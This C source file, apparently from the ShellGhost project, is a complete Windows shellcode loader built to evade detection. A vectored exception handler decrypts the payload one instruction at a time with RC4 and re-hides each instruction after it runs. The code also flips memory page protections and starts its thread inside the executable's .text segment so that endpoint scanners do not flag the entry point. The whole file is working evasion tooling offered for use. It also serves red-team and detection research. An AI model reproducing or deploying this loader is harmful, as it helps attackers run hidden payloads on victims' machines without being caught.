/*
*
* Author: Angelo Frasca Caccia (lem0nSec_)
* Date: 06/06/2023
* Title: Shellghost.c
* Website: https://github.com/lem0nSec/ShellGhost
*
*/


#include "ShellGhost.h"



/// <summary>
/// Check memory protection of newly PRV allocation
/// </summary>
/// <param name="allocation"></param>
/// <param name="allocation_size"></param>
/// <returns></returns>
DWORD CheckAllocationProtection(LPVOID allocation, DWORD allocation_size)
{
	MEMORY_BASIC_INFORMATION pMemInfo = { 0 };
	DWORD protection = 0;

	if (VirtualQuery((LPCVOID)allocation, &pMemInfo, (SIZE_T)allocation_size) != 0)
	{
		protection = pMemInfo.Protect;
	}

	return protection;

}


/// <summary>
/// Resolve specified instruction feature (opcodes quota, instruction rva from base, instruction number)
/// </summary>
/// <param name="pointer"></param>
/// <param name="dwOption"></param>
/// <returns></returns>
DWORD ResolveBufferFeature(PVOID pointer, INSTR_INFO dwOption)
{
	DWORD64 offset = 0;
	offset = (DWORD64)pointer - (DWORD64)allocation_base;

	for (DWORD i = 0; i <= instructionCount; i++)
	{
		if (offset == instruction[i].RVA)
		{
			switch (dwOption)
			{
			case INSTRUCTION_OPCODES_QUOTA:
				return instruction[i].quota;

			case INSTRUCTION_OPCODES_RVA:
				return instruction[i].RVA;

			case INSTRUCTION_OPCODES_NUMBER:
				return i; // return instruction number

			default:
				break;
			}
		}
	}

	return 0;

}


/// <summary>
/// Resolve nullbytes at the end of .text segment
/// </summary>
/// <returns></returns>
LPVOID ResolveEndofTextSegment()
{
	HMODULE hCurrent = 0;
	LPVOID pText = 0, pTextNull = 0;
	PIMAGE_DOS_HEADER pIDH = 0;
	PIMAGE_NT_HEADERS pINH = 0;
	PIMAGE_SECTION_HEADER pISH = 0;

	hCurrent = GetModuleHandleA(NULL);
	if (hCurrent != 0)
	{
		pIDH = (PIMAGE_DOS_HEADER)hCurrent;
		pINH = (PIMAGE_NT_HEADERS)((DWORD64)hCurrent + (DWORD64)pIDH->e_lfanew);
		pISH = (PIMAGE_SECTION_HEADER)((DWORD64)pINH + (DWORD64)sizeof(IMAGE_NT_HEADERS));
		pText = (LPVOID)((DWORD64)hCurrent + (DWORD64)pISH->VirtualAddress);
		pTextNull = (LPVOID)(((DWORD64)pText + (DWORD)pISH->Misc.VirtualSize) + 5);
	}

	return pTextNull;

}


/// <summary>
/// Modifies current breakpoint to be the next instruction to decrypt
/// </summary>
/// <param name="pointer"></param>
/// <returns></returns>
BOOL ResolveInstructionByRva(PVOID pointer)
{
	DWORD64 rva = ResolveBufferFeature(pointer, INSTRUCTION_OPCODES_RVA);
	for (DWORD i = 0; i < instruction[ResolveBufferFeature(pointer, INSTRUCTION_OPCODES_NUMBER)].quota; i++)
	{
		*(PBYTE)((DWORD_PTR)pointer + i) = *(PBYTE)((DWORD_PTR)sh + rva + i);
	}

	return TRUE;

}


/// <summary>
/// RC4 decryption routine
/// </summary>
/// <param name="pointer"></param>
/// <returns></returns>
NTSTATUS PatchShellcodeforException(PVOID pointer)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	USTRING buf, key;
	PSYSTEMFUNCTION032 SystemFunction032 = 0;
	HMODULE advBase = 0;

	advBase = GetModuleHandleA("advapi32.dll");
	if (advBase == 0)
	{
		advBase = LoadLibraryA("advapi32.dll");
	}

	if (advBase != 0)
	{
		memset(&buf, 0, sizeof(buf));
		memset(&key, 0, sizeof(k));
		buf.buffer = (PVOID)pointer;
		buf.Length = ResolveBufferFeature(pointer, INSTRUCTION_OPCODES_QUOTA);
		key.buffer = k;
		key.Length = keySize;

		SystemFunction032 = (PSYSTEMFUNCTION032)GetProcAddress(advBase, "SystemFunction032");
		if (SystemFunction032 != 0)
		{
			status = SystemFunction032(&buf, &key);
		}

	}

	return status;

}


/// <summary>
/// Resolve null-terminated string that is passed to a winapi call (RCX only for now -> first parameter)
/// </summary>
/// <param name="contextRecord"></param>
/// <returns></returns>
BOOL AdjustFunctionParameters(PCONTEXT contextRecord)
{
	BOOL status = FALSE;

	if ((contextRecord->Rcx >= (DWORD64)allocation_base) && (contextRecord->Rcx <= ((DWORD64)allocation_base + sizeof(sh))))
	{
		if (*(PBYTE)contextRecord->Rcx == 0xCC)
		{
			DWORD current_instruction = ResolveBufferFeature((PVOID)contextRecord->Rcx, INSTRUCTION_OPCODES_NUMBER);
			PVOID pointer = (PVOID)(contextRecord->Rcx);

			while (status != TRUE)
			{
				ResolveInstructionByRva(pointer);
				PatchShellcodeforException(pointer);
				for (DWORD i = 0; i < instruction[current_instruction].quota; i++)
				{
					if (*(PBYTE)((DWORD_PTR)pointer + i) == 0x00)
					{
						status = TRUE;
						break;
					}
				}

				pointer = (PVOID)((DWORD_PTR)pointer + instruction[current_instruction].quota);
				current_instruction++;

			}
		}
	}

	return status;

}


/// <summary>
/// Hide previously executed instruction
/// </summary>
/// <param name="pointer"></param>
/// <returns></returns>
BOOL RestorePreviousInstructionBreakpoint(PVOID pointer)
{
	DWORD current_instruction = ResolveBufferFeature(pointer, INSTRUCTION_OPCODES_NUMBER);
	for (DWORD i = 0; i < instruction[current_instruction].quota; i++)
	{
		*(PBYTE)((DWORD_PTR)pointer + i) = 0xCC;
	}

	return TRUE;
}


/// <summary>
/// Main VEH handler
/// </summary>
/// <param name="exceptionData"></param>
/// <returns></returns>
LONG CALLBACK InterceptShellcodeException(EXCEPTION_POINTERS* exceptionData)
{
	if (((exceptionData->ContextRecord->Rip >= (DWORD64)allocation_base) && (exceptionData->ContextRecord->Rip <= (DWORD64)allocation_base + sizeof(sh))) || ((LPVOID)exceptionData->ContextRecord->Rip == ResolveEndofTextSegment()))
	{
		if ((LPVOID)exceptionData->ContextRecord->Rip == ResolveEndofTextSegment())
		{
			exceptionData->ContextRecord->Rip = (DWORD64)allocation_base;
		}

		DWORD old = 0;

		if (CheckAllocationProtection((LPVOID)exceptionData->ContextRecord->Rip, bufSize) == PAGE_EXECUTE_READ)
		{
			VirtualProtect((LPVOID)exceptionData->ContextRecord->Rip, bufSize, PAGE_READWRITE, &old);
		}

		if (previous_instruction >= allocation_base)
		{
			RestorePreviousInstructionBreakpoint(previous_instruction);
		}

		if ((exceptionData->ExceptionRecord->ExceptionCode == EXCEPTION_BREAKPOINT) || ((LPVOID)exceptionData->ContextRecord->Rip == allocation_base))
		{
			ResolveInstructionByRva((PVOID)exceptionData->ContextRecord->Rip);
			if (PatchShellcodeforException((PVOID)exceptionData->ContextRecord->Rip) == STATUS_UNSUCCESSFUL)
			{
				goto cleanup;
			}

			previous_instruction = (PVOID)exceptionData->ContextRecord->Rip;

			if (*(PWORD)exceptionData->ContextRecord->Rip == 0xe0ff) // jmp rax
			{
				*(PWORD)exceptionData->ContextRecord->Rip = 0xCCCC;	// we'll never execute that jmp rax...
				AdjustFunctionParameters(exceptionData->ContextRecord);
				exceptionData->ContextRecord->Rip = exceptionData->ContextRecord->Rax; // ...override PRV allocation when calling a winapi
				RestorePreviousInstructionBreakpoint(previous_instruction);
				
				return EXCEPTION_CONTINUE_EXECUTION;
			}
		}

		VirtualProtect((LPVOID)exceptionData->ContextRecord->Rip, bufSize, PAGE_EXECUTE_READ, &old);

		return EXCEPTION_CONTINUE_EXECUTION;

	}
	else
	{
		goto cleanup;
	}

cleanup:
	ExitThread(0);

}


int main()
{
	FreeConsole();
	HANDLE hThread = 0;

	instruction[0].RVA = 0;
	instruction[0].quota = 1;
	instruction[1].RVA = 1;
	instruction[1].quota = 4;
	instruction[2].RVA = 5;
	instruction[2].quota = 5;
	instruction[3].RVA = 10;
	instruction[3].quota = 2;
	instruction[4].RVA = 12;
	instruction[4].quota = 2;
	instruction[5].RVA = 14;
	instruction[5].quota = 1;
	instruction[6].RVA = 15;
	instruction[6].quota = 1;
	instruction[7].RVA = 16;
	instruction[7].quota = 1;
	instruction[8].RVA = 17;
	instruction[8].quota = 3;
	instruction[9].RVA = 20;
	instruction[9].quota = 5;
	instruction[10].RVA = 25;
	instruction[10].quota = 4;
	instruction[11].RVA = 29;
	instruction[11].quota = 4;
	instruction[12].RVA = 33;
	instruction[12].quota = 4;
	instruction[13].RVA = 37;
	instruction[13].quota = 5;
	instruction[14].RVA = 42;
	instruction[14].quota = 3;
	instruction[15].RVA = 45;
	instruction[15].quota = 3;
	instruction[16].RVA = 48;
	instruction[16].quota = 1;
	instruction[17].RVA = 49;
	instruction[17].quota = 2;
	instruction[18].RVA = 51;
	instruction[18].quota = 2;
	instruction[19].RVA = 53;
	instruction[19].quota = 2;
	instruction[20].RVA = 55;
	instruction[20].quota = 4;
	instruction[21].RVA = 59;
	instruction[21].quota = 3;
	instruction[22].RVA = 62;
	instruction[22].quota = 2;
	instruction[23].RVA = 64;
	instruction[23].quota = 1;
	instruction[24].RVA = 65;
	instruction[24].quota = 2;
	instruction[25].RVA = 67;
	instruction[25].quota = 4;
	instruction[26].RVA = 71;
	instruction[26].quota = 3;
	instruction[27].RVA = 74;
	instruction[27].quota = 3;
	instruction[28].RVA = 77;
	instruction[28].quota = 6;
	instruction[29].RVA = 83;
	instruction[29].quota = 3;
	instruction[30].RVA = 86;
	instruction[30].quota = 2;
	instruction[31].RVA = 88;
	instruction[31].quota = 3;
	instruction[32].RVA = 91;
	instruction[32].quota = 1;
	instruction[33].RVA = 92;
	instruction[33].quota = 3;
	instruction[34].RVA = 95;
	instruction[34].quota = 4;
	instruction[35].RVA = 99;
	instruction[35].quota = 3;
	instruction[36].RVA = 102;
	instruction[36].quota = 2;
	instruction[37].RVA = 104;
	instruction[37].quota = 3;
	instruction[38].RVA = 107;
	instruction[38].quota = 4;
	instruction[39].RVA = 111;
	instruction[39].quota = 3;
	instruction[40].RVA = 114;
	instruction[40].quota = 3;
	instruction[41].RVA = 117;
	instruction[41].quota = 3;
	instruction[42].RVA = 120;
	instruction[42].quota = 1;
	instruction[43].RVA = 121;
	instruction[43].quota = 4;
	instruction[44].RVA = 125;
	instruction[44].quota = 3;
	instruction[45].RVA = 128;
	instruction[45].quota = 2;
	instruction[46].RVA = 130;
	instruction[46].quota = 2;
	instruction[47].RVA = 132;
	instruction[47].quota = 5;
	instruction[48].RVA = 137;
	instruction[48].quota = 3;
	instruction[49].RVA = 140;
	instruction[49].quota = 2;
	instruction[50].RVA = 142;
	instruction[50].quota = 1;
	instruction[51].RVA = 143;
	instruction[51].quota = 4;
	instruction[52].RVA = 147;
	instruction[52].quota = 3;
	instruction[53].RVA = 150;
	instruction[53].quota = 5;
	instruction[54].RVA = 155;
	instruction[54].quota = 4;
	instruction[55].RVA = 159;
	instruction[55].quota = 3;
	instruction[56].RVA = 162;
	instruction[56].quota = 4;
	instruction[57].RVA = 166;
	instruction[57].quota = 3;
	instruction[58].RVA = 169;
	instruction[58].quota = 2;
	instruction[59].RVA = 171;
	instruction[59].quota = 2;
	instruction[60].RVA = 173;
	instruction[60].quota = 1;
	instruction[61].RVA = 174;
	instruction[61].quota = 1;
	instruction[62].RVA = 175;
	instruction[62].quota = 1;
	instruction[63].RVA = 176;
	instruction[63].quota = 2;
	instruction[64].RVA = 178;
	instruction[64].quota = 2;
	instruction[65].RVA = 180;
	instruction[65].quota = 2;
	instruction[66].RVA = 182;
	instruction[66].quota = 4;
	instruction[67].RVA = 186;
	instruction[67].quota = 2;
	instruction[68].RVA = 188;
	instruction[68].quota = 2;
	instruction[69].RVA = 190;
	instruction[69].quota = 1;
	instruction[70].RVA = 191;
	instruction[70].quota = 2;
	instruction[71].RVA = 193;
	instruction[71].quota = 1;
	instruction[72].RVA = 194;
	instruction[72].quota = 3;
	instruction[73].RVA = 197;
	instruction[73].quota = 5;
	instruction[74].RVA = 202;
	instruction[74].quota = 1;
	instruction[75].RVA = 203;
	instruction[75].quota = 10;
	instruction[76].RVA = 213;
	instruction[76].quota = 7;
	instruction[77].RVA = 220;
	instruction[77].quota = 6;
	instruction[78].RVA = 226;
	instruction[78].quota = 2;
	instruction[79].RVA = 228;
	instruction[79].quota = 5;
	instruction[80].RVA = 233;
	instruction[80].quota = 6;
	instruction[81].RVA = 239;
	instruction[81].quota = 2;
	instruction[82].RVA = 241;
	instruction[82].quota = 4;
	instruction[83].RVA = 245;
	instruction[83].quota = 2;
	instruction[84].RVA = 247;
	instruction[84].quota = 2;
	instruction[85].RVA = 249;
	instruction[85].quota = 3;
	instruction[86].RVA = 252;
	instruction[86].quota = 2;
	instruction[87].RVA = 254;
	instruction[87].quota = 5;
	instruction[88].RVA = 259;
	instruction[88].quota = 2;
	instruction[89].RVA = 261;
	instruction[89].quota = 1;
	instruction[90].RVA = 262;
	instruction[90].quota = 3;
	instruction[91].RVA = 265;
	instruction[91].quota = 2;
	instruction[92].RVA = 267;
	instruction[92].quota = 1;
	instruction[93].RVA = 268;
	instruction[93].quota = 1;
	instruction[94].RVA = 269;
	instruction[94].quota = 1;
	instruction[95].RVA = 270;
	instruction[95].quota = 1;
	instruction[96].RVA = 271;
	instruction[96].quota = 4;
	instruction[97].RVA = 275;
	instruction[97].quota = 1;


	allocation_base = VirtualAlloc(0, sizeof(sh), MEM_COMMIT, PAGE_READWRITE);
	if (allocation_base != NULL)
	{
		for (DWORD i = 0; i <= sizeof(sh); i++)
		{
			*(PBYTE)((DWORD_PTR)allocation_base + i) = 0xCC;
		}

		// The new thread entrypoint will be inside a IMG memory space (.text segment).
		// This is because an entrypoint in an area other than IMG is often considered an IOC.
		hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ResolveEndofTextSegment(), 0, 0, 0);
		if (hThread != 0)
		{
			if (AddVectoredExceptionHandler(1, InterceptShellcodeException) != NULL)
			{
				WaitForSingleObject(hThread, INFINITE);
				RemoveVectoredExceptionHandler(InterceptShellcodeException);
			}
			CloseHandle(hThread);
		}

		VirtualFree(allocation_base, 0, MEM_RELEASE);

	}

	return 0;

}